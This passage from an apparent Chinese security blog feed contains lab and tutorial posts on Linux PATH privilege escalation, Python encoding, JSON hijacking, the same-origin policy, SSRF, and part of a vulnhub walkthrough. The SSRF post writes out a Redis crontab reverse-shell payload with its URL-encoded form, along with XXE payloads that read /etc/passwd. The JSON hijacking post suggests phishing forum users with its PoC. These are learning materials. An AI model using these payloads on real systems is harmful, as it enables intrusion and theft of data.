alt></li></ol><p><strong>symlink命令</strong></p><pre><code>ln -s /bin/bash psexport PATH=/tmp:$PATH./testwhoami</code></pre><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><pre><code>#include &lt;unistd.h&gt;void main(){        setuid(0);        setgid(0);        system(&quot;ps&quot;);}</code></pre><ol><li>执行命令为ps，可换成其他带SUID权限可执行的命令</li><li>id</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/8.png" alt></li><li>whoami</li><li>pwd</li><li>cat /etc/passwd</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python与编码解码</title>
      <link href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"/>
      <url>/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-python2-和-python3"><a href="#0x00-python2-和-python3" class="headerlink" title="0x00 python2 和 python3"></a>0x00 python2 和 python3</h2><ol><li>python2和python3</li><li>获取当前系统不同Python版本的默认编码</li><li>import sys</li><li>sys.getdefaultencoding() 或 sys.getfilesystemencoding()</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/13.png" alt></li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/14.png" alt></li><li>获取默认的区域设置</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/15.png" alt></li></ol><h3 id="0x01-相关内置函数"><a href="#0x01-相关内置函数" class="headerlink" title="0x01 相关内置函数"></a>0x01 相关内置函数</h3><ol><li>chr() #把整型int转换为ascii型</li><li>ord() #把ascii型转换为整型int</li><li>hex() #把相关进制转换为16进制</li><li>oct() #把相关进制转换为8进制</li><li>bin() #把相关进制转换为2进制</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/21.png" alt></li></ol><h2 id="0x10-进制家族"><a href="#0x10-进制家族" class="headerlink" title="0x10 进制家族"></a>0x10 进制家族</h2><h3 id="0x11-二进制"><a href="#0x11-二进制" class="headerlink" title="0x11 二进制"></a>0x11 二进制</h3><ol><li>2进制转8进制</li><li>oct(0b1100)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/2.png" alt></li><li>2进制转10进制</li><li>int(‘1100’,2)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/1.png" alt></li><li>2进制转16进制</li><li>hex(0b1100)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/3.png" alt></li></ol><h3 id="0x12-八进制"><a href="#0x12-八进制" class="headerlink" title="0x12 八进制"></a>0x12 八进制</h3><ol><li>8进制转2进制</li><li>bin(0o12)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/4.png" alt></li><li>8进制转10进制</li><li>int(0o12)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/5.png" alt></li><li>8进制转16进制</li><li>hex(0o12)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/6.png" alt></li></ol><h3 id="0x13-十进制"><a href="#0x13-十进制" class="headerlink" title="0x13 十进制"></a>0x13 十进制</h3><ol><li>10进制转2进制</li><li>bin(14)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/7.png" alt></li><li>10进制转8进制</li><li>oct(14)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/8.png" alt></li><li>10进制转16进制</li><li>hex(14)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/9.png" alt></li></ol><h3 id="0x14-十六进制"><a href="#0x14-十六进制" class="headerlink" title="0x14 十六进制"></a>0x14 十六进制</h3><ol><li>16进制转2进制</li><li>bin(0xf)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/10.png" alt></li><li>16进制转8进制</li><li>oct(0xf)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/11.png" alt></li><li>16进制转10进制</li><li>int(0xf)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/12.png" alt></li></ol><h3 id="0x15-相关在线工具进制转换"><a href="#0x15-相关在线工具进制转换" class="headerlink" title="0x15 相关在线工具进制转换"></a>0x15 相关在线工具进制转换</h3><ol><li><a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">https://tool.lu/hexconvert/</a></li><li><a href="https://tool.oschina.net/hexconvert/" target="_blank" rel="noopener">https://tool.oschina.net/hexconvert/</a></li></ol><h2 id="0x20-base家族"><a href="#0x20-base家族" class="headerlink" title="0x20 base家族"></a>0x20 base家族</h2><ol><li>模块：<a href="https://github.com/python/cpython/blob/3.8/Lib/base64.py" target="_blank" rel="noopener">base64</a><pre><code>#python2#coding:utf-8import base64def start(): #s=input(&#39;string: &#39;)   #正常字符串输入：&quot;python2&quot;，直接输入python2会报错 #s=s.encode(&#39;utf-8&#39;)   #python3中字符都为unicode编码，而b64encode函数的参数为byte类型，     #所以必须先转码，否则报错return binascii.hexlify(s).upper()，     #TypeError: a bytes-like object is required, not &#39;str&#39; s=raw_input(&#39;input string: &#39;)  #所有输入都作为字符串 print &#39;1. b16_encode\n&#39; print &#39;2. b16_decode\n&#39; print &#39;3. b32_encode\n&#39; print &#39;4. b32_decode\n&#39; print &#39;5. b64_encode\n&#39; print &#39;6. b64_decode\n&#39; print &#39;7. current string\n&#39; num(s)def num(s): n=input(&#39;number(1-6 , 0 exit): &#39;) if n&gt;0 and n&lt;8:     t=base64encode_decode(n,s)     num(t) else:     exit()def base64encode_decode(n,s):     if n==1:     s_b16encode=base64.b16encode(s)     print s_b16encode     return s_b16encode elif n==2:     s_b16decode=base64.b16decode(s)     print s_b16decode     return s_b16decode elif n==3:     s_b32encode=base64.b32encode(s)     print s_b32encode     return s_b32encode elif n==4:     s_b32decode=base64.b32decode(s)     print s_b32decode     return s_b32decode elif n==5:     s_b64encode=base64.b64encode(s)     print s_b64encode     return s_b64encode elif n==6:     s_b64decode=base64.b64decode(s)     print s_b64decode     return s_b64decode elif n==7:     print s     return s else:     print &#39;only 1-6&#39;if __name__ == &#39;__main__&#39;: start()</code></pre></li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/19.png" alt></li><li><strong>去掉编码前的b</strong></li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/20.png" alt></li></ol><h3 id="0x21-base编码序列在线工具"><a href="#0x21-base编码序列在线工具" class="headerlink" title="0x21 base编码序列在线工具"></a>0x21 base编码序列在线工具</h3><ol><li><a href="https://www.qqxiuzi.cn/bianma/base64.htm" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base64.htm</a></li></ol><h2 id="0x30-binascii模块"><a href="#0x30-binascii模块" class="headerlink" title="0x30 binascii模块"></a>0x30 binascii模块</h2><pre><code>import binasciistr_raw=&#39;python3&#39;print(str_raw,type(str_raw)) #原字符串与类型str_bytes=str_raw.encode(&#39;utf-8&#39;) #转换成二进制数据与新类型print(str_bytes,type(str_bytes))print(binascii.b2a_hex(str_bytes)) #bytes转16进制的asciistr_ascii=binascii.b2a_hex(str_bytes) print(binascii.a2b_hex(str_ascii)) #ascii转bytes</code></pre><ol><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/22.png" alt></li></ol><h3 id="0x31-string转bytes"><a href="#0x31-string转bytes" class="headerlink" title="0x31 string转bytes"></a>0x31 string转bytes</h3><ol><li>bytes()</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/23.png" alt></li></ol><h3 id="0x32-bytes转string"><a href="#0x32-bytes转string" class="headerlink" title="0x32 bytes转string"></a>0x32 bytes转string</h3><ol><li>str_bytes_utf8.decode() #默认不用填，指定编码方式，则填，str_bytes_utf8.decode(‘gb2312’)</li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/24.png" alt></li></ol><h2 id="0x40-uuencode-amp-amp-uudecode"><a href="#0x40-uuencode-amp-amp-uudecode" class="headerlink" title="0x40 uuencode &amp;&amp; uudecode"></a>0x40 uuencode &amp;&amp; uudecode</h2><ol><li><a href="https://github.com/python/cpython/blob/master/Lib/uu.py" target="_blank" rel="noopener">uu模块</a></li><li><strong>uuencode.py</strong><pre><code>#coding:utf-8import uuwith open(&#39;1.txt&#39;,&#39;rb&#39;) as in_file,open(&#39;2.txt&#39;,&#39;wb&#39;) as out_file: uu.encode(in_file,out_file)</code></pre></li><li><strong>1.txt</strong><pre><code>python2</code></pre></li><li><strong>2.txt</strong></li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/16.png" alt></li><li><strong>uudecode.py</strong><pre><code>#coding:utf-8import uuwith open(&#39;2.txt&#39;,&#39;rb&#39;) as in_file:    uu.decode(in_file)   #直接输出或输出到文件 ,out_file)  如 ,&#39;3.txt&#39;) </code></pre></li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/18.png" alt></li><li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/17.png" alt></li></ol><h3 id="0x41-一些在线编码解码工具"><a href="#0x41-一些在线编码解码工具" class="headerlink" title="0x41 一些在线编码解码工具"></a>0x41 一些在线编码解码工具</h3><ol><li><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></li><li><a href="http://www.mxcz.net/tools/uuencode.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/uuencode.aspx</a></li><li><a href="https://www.qqxiuzi.cn/bianma/uuencode.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/uuencode.php</a></li></ol><h3 id="0x42-uu模块相关参考"><a href="#0x42-uu模块相关参考" class="headerlink" title="0x42 uu模块相关参考"></a>0x42 uu模块相关参考</h3><ol><li><a href="https://docs.python.org/zh-cn/2.7/library/uu.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/2.7/library/uu.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> encode_decode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON劫持攻击</title>
      <link href="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/"/>
      <url>/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-JSON劫持"><a href="#0x00-JSON劫持" class="headerlink" title="0x00 JSON劫持"></a>0x00 JSON劫持</h2><ol><li>JSON劫持（JSON Hijacking）</li><li><strong>漏洞危害：</strong></li><li>可能用户权限被盗用</li><li>可能通过劫持对网页挂马</li><li>可能对劫持页面进行网站钓鱼</li><li>可能被拒绝服务攻击</li><li>可能提权攻击</li></ol><h2 id="0x01-JSON"><a href="#0x01-JSON" class="headerlink" title="0x01 JSON"></a>0x01 JSON</h2><ol><li><p>JSON：javascript object notation（javascript对象表示法），一种轻量级的数据交换格式。没有复杂的语法，通过重载大括号{}操作符的含义来实现（原本大括号代表的是代码块的分界，多条语句的集合）。</p></li><li><p>一个正确的大括号用作表达式的例子：</p></li><li><p><strong>test.json</strong></p><pre><code>var test_object={ &quot;name&quot;:&quot;AAA&quot;, &quot;age&quot;:&quot;20&quot;, &quot;id&quot;:&quot;123&quot;, &quot;phone&quot;:&quot;13012345678&quot;};alert(test_object.name);</code></pre><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/1.png" alt></p></li><li><p><strong>JSON.html</strong></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;JSON&lt;/title&gt; &lt;/head&gt; &lt;body&gt;     &lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.100.5/test.json&quot;&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;</code></pre></li><li><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/2.png" alt></p></li></ol><h2 id="0x02-JSON劫持攻击"><a href="#0x02-JSON劫持攻击" class="headerlink" title="0x02 JSON劫持攻击"></a>0x02 JSON劫持攻击</h2><ol><li><p>假设用户AAA成功登录之后，返回一串JSON格式的用户信息，如</p></li><li><p>AAA({“data”:{“name”:”AAA”,”age”:”20”,”id”:”123”,”phone”:”13012345678”}});</p><pre><code>&lt;?php$info=$_GET[&#39;info&#39;];print $info.&#39;({&quot;data&quot;:{&quot;name&quot;:&quot;AAA&quot;,&quot;age&quot;:&quot;20&quot;,&quot;id&quot;:&quot;123&quot;,&quot;phone&quot;:&quot;13012345678&quot;}})&#39;;?&gt;</code></pre></li><li><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/4.png" alt></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;JSON&lt;/title&gt;     &lt;script&gt;         function AAA(user){             alert(user.data.phone);         }     &lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.100.5/test.php?info=AAA&quot;&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;</code></pre></li><li><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/3.png" alt></p></li><li><p>例子成功获取用户信息</p></li></ol><h2 id="0x03-JSON劫持攻击之钓鱼"><a href="#0x03-JSON劫持攻击之钓鱼" class="headerlink" title="0x03 JSON劫持攻击之钓鱼"></a>0x03 JSON劫持攻击之钓鱼</h2><ol start="4"><li>把JSON.html发到论坛、贴吧等等，让用户点击，获取用户名替换AAA，就可获取到相关用户的信息。</li><li>附安全大佬的截图</li><li><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/5.png" alt></li></ol><h2 id="0x04-JSON劫持漏洞修复"><a href="#0x04-JSON劫持漏洞修复" class="headerlink" title="0x04 JSON劫持漏洞修复"></a>0x04 JSON劫持漏洞修复</h2><ol><li>添加Referer白名单</li><li>请求头中添加CSRF token并在后端验证</li><li>不发送JSON数组的格式</li><li>强制使用POST方法访问API</li><li>禁用API</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略</title>
      <link href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
      <url>/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-同源策略"><a href="#0x00-同源策略" class="headerlink" title="0x00 同源策略"></a>0x00 同源策略</h2><h2 id="0x01-同源策略"><a href="#0x01-同源策略" class="headerlink" title="0x01 同源策略"></a>0x01 同源策略</h2><ol><li><p>同源策略，是由Netscape提出的一个著名的安全策略，是浏览器最核心也最基本的安全功能，所有支持javascript的浏览器都会使用这个策略。</p></li><li><p>所谓同源：是指不同的两个页面的协议、域名、端口都相同。</p></li><li><p>原：<a href="http://bbb.aaa.com/home/index.html" target="_blank" rel="noopener">http://bbb.aaa.com/home/index.html</a></p></li><li><p>同源：<a href="http://bbb.aaa.com/admin/login.html" target="_blank" rel="noopener">http://bbb.aaa.com/admin/login.html</a> #只有路径不同</p></li><li><p>同源：<a href="http://bbb.aaa.com/home/path/search.html" target="_blank" rel="noopener">http://bbb.aaa.com/home/path/search.html</a> #只有路径不同</p></li><li><p>不同源：<a href="https://bbb.aaa.com/home/info.html" target="_blank" rel="noopener">https://bbb.aaa.com/home/info.html</a> #不同协议（http、https）</p></li><li><p>不同源：<a href="http://ccc.aaa.com/home/info.html" target="_blank" rel="noopener">http://ccc.aaa.com/home/info.html</a> #不同域名（bbb.aaa.com、ccc.aaa.com）</p></li><li><p>不同源：<a href="http://bbb.aaa.com:8080/home/info.html" target="_blank" rel="noopener">http://bbb.aaa.com:8080/home/info.html</a> #不同端口（默认80、8080）</p></li><li><p>同源策略限制不同源的客户端脚本在未授权的情况下，不能读写对方的资源。</p></li><li><p>主要分DOM同源策略、XMLHttpRequests同源策略</p></li></ol><h2 id="0x02-跨域"><a href="#0x02-跨域" class="headerlink" title="0x02 跨域"></a>0x02 跨域</h2><ol><li><p><strong>DOM同源策略</strong>，主要是iframe跨域</p></li><li><p>假如一个黑网站，使用iframe嵌套一个用户信任网站（如淘宝、银行等等）</p></li><li><p>把iframe宽高调到页面全部，这样表面上除了域名不同，其他都一样</p></li><li><p>这时用户输入账号密码，这样黑网站就可以跨域访问到信任网站的DOM节点，获取用户的账号密码。</p></li><li></li><li><p>正常的百度搜索页面</p></li><li><p><img src="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/1.png" alt></p></li><li><p>iframe嵌套显示整个页面</p></li><li><p><img src="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/2.png" alt></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html style=&quot;height: 100%&quot;&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;iframe baidu&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;height: 100%&quot;&gt;     &lt;iframe src=&quot;https://www.baidu.com&quot; width=&quot;100%&quot; height=&quot;100%&quot; frameborder=0 scrolling=&quot;no&quot;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt;</code></pre></li><li><p><strong>XMLHttpRequest同源策略</strong>，攻击者可利用CSRF攻击</p></li><li><p>用户登录信任网站，信任网站就会在用户的cookie中添加用户标识</p></li><li><p>同时，用户访问了恶意网站，执行了恶意网站中的AJAX请求代码</p></li><li><p>恶意网站利用信任网站给用户的用户标识，向信任网站发起AJAX HTTP请求（恶意请求），同浏览器请求时附带用户标识</p></li><li><p>信任网站获取到请求数据包中的用户标识，就默认是合法用户的正常操作，接着信任网站就响应了恶意请求</p></li><li><p>或返回用户的敏感信息，或执行了恶意操作（增删改）等等</p></li><li><p>由于AJAX是在后台执行的，用户无法直接查看到这一过程。</p></li></ol><p><strong>允许跨域访问</strong></p><ol><li>使用 CORS 允许跨源访问。</li></ol><p><strong>阻止跨域访问</strong></p><ol><li>阻止跨域写操作，只要检测请求中的一个不可测的标记(CSRF token)即可，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。必须使用这个标记来阻止页面的跨站读操作。</li><li>阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。</li><li>阻止跨站嵌入，需要确保你的资源不能是以上列出的可嵌入资源格式。多数情况下浏览器都不会遵守 Content-Type 消息头。例如，如果您在HTML文档中指定 <script> 标记，则浏览器将尝试将HTML解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入。</li></ol><h2 id="0x03-JavaScript的同源策略"><a href="#0x03-JavaScript的同源策略" class="headerlink" title="0x03 JavaScript的同源策略"></a>0x03 JavaScript的同源策略</h2><ol><li>Json hijacking</li></ol><h2 id="0x04-XSSI"><a href="#0x04-XSSI" class="headerlink" title="0x04 XSSI"></a>0x04 XSSI</h2><ol><li>Cross Site Script Inclusion (XSSI) 跨站脚本包含是一种允许攻击者通过恶意JS绕过边界窃取信息的攻击技术。</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></li><li><a href="https://www.cnblogs.com/laixiangran/p/9064769.html" target="_blank" rel="noopener">https://www.cnblogs.com/laixiangran/p/9064769.html</a></li></ol></script></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/SSRF/"/>
      <url>/SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-SSRF"><a href="#0x00-SSRF" class="headerlink" title="0x00 SSRF"></a>0x00 SSRF</h2><p>&ensp;&ensp;&ensp;&ensp;SSRF（Server-Side Request Forgery）服务器端请求伪造：一种由外网攻击者构造请求，利用连通内外网的服务器向内网发起请求的安全漏洞。一般情况下，这里分内外网，其实就是两个不能直通的局域网，通过同时连接内外网的主机来实现请求访问。</p><h2 id="0x01-SSRF分类"><a href="#0x01-SSRF分类" class="headerlink" title="0x01 SSRF分类"></a>0x01 SSRF分类</h2><ol><li>可明确判断的响应</li><li>不可明确判断的响应</li></ol><h2 id="0x02-SSRF常出现的位置"><a href="#0x02-SSRF常出现的位置" class="headerlink" title="0x02 SSRF常出现的位置"></a>0x02 SSRF常出现的位置</h2><ol><li>云服务器</li><li>远程图片加载（编辑器远程图片加载，头像）</li><li>网站采集、网页抓取</li><li>url有输入域名或IP的参数</li></ol><h2 id="0x03-SSRF危害"><a href="#0x03-SSRF危害" class="headerlink" title="0x03 SSRF危害"></a>0x03 SSRF危害</h2><ol><li>内部服务器的服务信息与端口信息被搜集</li><li>WAF或CDN被绕过</li><li>内网中的一些服务或程序被恶意执行（Redis）</li><li>绕过目录限制，访问内网web目录的其他目录或文件，本服务器的应用程序被恶意执行或攻击</li><li>下载内网文件资源</li></ol><h2 id="0x04-SSRF例子"><a href="#0x04-SSRF例子" class="headerlink" title="0x04 SSRF例子"></a>0x04 SSRF例子</h2><ol><li><strong>weblogic SSRF CVE-2014-4210</strong></li><li><strong>靶场例子</strong></li><li><img src="/SSRF/4.png" alt></li><li>远程文件读取</li><li><img src="/SSRF/5.png" alt></li><li><img src="/SSRF/6.png" alt></li><li>内网端口扫描</li><li><img src="/SSRF/7.png" alt></li><li><img src="/SSRF/8.png" alt></li><li>同理，可以远程执行命令（需要Redis服务，写入到计划任务中，反弹shell）</li></ol><p><strong>相关代码</strong></p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p><strong>URL编码</strong></p><pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Atest</code></pre><h2 id="0x05-SSRF测试工具"><a href="#0x05-SSRF测试工具" class="headerlink" title="0x05 SSRF测试工具"></a>0x05 SSRF测试工具</h2><ol><li><strong>curl</strong></li><li>curl -v file:///etc/passwd</li><li><img src="/SSRF/1.png" alt></li><li>curl -v <a href="ftp://192.168.100.19:80/" target="_blank" rel="noopener">ftp://192.168.100.19:80/</a> #端口存活，连接就会等待一段时间</li><li><img src="/SSRF/2.png" alt></li><li>端口不存活就即刻显示失败，通过错误信息也可以对比出：存活端口显示响应读取失败，不存活端口直接是连接失败</li><li><img src="/SSRF/3.png" alt></li></ol><h2 id="0x10-bee-bug靶场"><a href="#0x10-bee-bug靶场" class="headerlink" title="0x10 bee-bug靶场"></a>0x10 bee-bug靶场</h2><h3 id="0x11-利用RFI来扫描内网"><a href="#0x11-利用RFI来扫描内网" class="headerlink" title="0x11 利用RFI来扫描内网"></a>0x11 利用RFI来扫描内网</h3><ol><li>原理：本机192.168.0.102——内外网主机192.168.100.18——内网主机192.168.100.14</li></ol><pre><code>&lt;?php set_time_limit(0);  #0，永久执行直到程序结束，大于0，则不管程序是否执行完，到设定的秒数就程序结束。#error_reporting(0);  #0，关闭所有php错误报告$ports_list=array(22,25,80,443);#$ip=$_GET[&#39;ip&#39;];$ip=$_POST[&#39;ip&#39;];foreach ($ports_list as $p) {    $fp=@fsockopen($ip,$p,$errno,$errstr,0.1);    if($fp){        echo $p.&quot;  opened&quot;;        echo &quot;&lt;br/&gt;&quot;;    }    else{        continue;    }}ob_flush();flush();</code></pre><p><img src="/SSRF/9.png" alt></p><h3 id="0x12-利用XXE读文件"><a href="#0x12-利用XXE读文件" class="headerlink" title="0x12 利用XXE读文件"></a>0x12 利用XXE读文件</h3><p><strong>原POST内容</strong></p><pre><code>&lt;reset&gt;    &lt;login&gt;bee&lt;/login&gt;    &lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code></pre><p><strong>XXE读文件</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;reset&gt;    &lt;login&gt;&amp;xxe;&lt;/login&gt;    &lt;secret&gt;&lt;/secret&gt;&lt;/reset&gt;</code></pre><p><img src="/SSRF/11.png" alt><br><img src="/SSRF/10.png" alt></p><p><strong>php协议base64编码读取的数据</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;]&gt;&lt;reset&gt;    &lt;login&gt;&amp;xxe;&lt;/login&gt;    &lt;secret&gt;&lt;/secret&gt;&lt;/reset&gt;</code></pre><p><img src="/SSRF/12.png" alt><br><img src="/SSRF/13.png" alt></p><p><strong>访问百度</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://www.baidu.com/&quot;&gt;]&gt;&lt;reset&gt;    &lt;login&gt;&amp;xxe;&lt;/login&gt;    &lt;secret&gt;&lt;/secret&gt;&lt;/reset&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之chakravyuh</title>
      <link href="/vulnhub%E4%B9%8Bchakravyuh/"/>
      <url>/vulnhub%E4%B9%8Bchakravyuh/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/vulnhub%E4%B9%8Bchakravyuh/1.png" alt></p><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ol><li>虚拟机自动获取IP</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/2.png" alt></li><li>nmap扫端口</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/3.png" alt> </li><li>FTP允许匿名登录，查看目录及文件，下载文件</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/4.png" alt></li><li>解压文件，要密码</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/5.png" alt></li><li>使用<a href="https://github.com/truongkma/ctf-tools/blob/master/John/run/7z2john.py" target="_blank" rel="noopener">7z2john.py</a>来提取文件的hash值，john来破解hash</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/6.png" alt></li><li>得密码为family，解压，得一串字符串</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/7.png" alt></li><li>Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=，像base64字符串，解码一下</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/8.png" alt></li><li>gila:<a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>:princesa，用户名<a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>，密码princesa，gila并不清楚是啥</li><li>当目录访问一下<a href="http://192.168.100.7/gila/，发现可访问" target="_blank" rel="noopener">http://192.168.100.7/gila/，发现可访问</a></li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/9.png" alt></li><li>找CMS默认后台，是admin，访问<a href="http://192.168.100.7/gila/admin，登录" target="_blank" rel="noopener">http://192.168.100.7/gila/admin，登录</a></li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/10.png" alt></li><li>搜索gila cms漏洞</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/11.png" alt></li><li>本地文件包含漏洞，试试包含Linux的/etc/passwd</li><li><img src="/vulnhub%E4%B9%8Bchakravyuh/12.png" alt></li><li>发现只能包含/gila目录下的文件，点击index.php，在文章下插入<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" 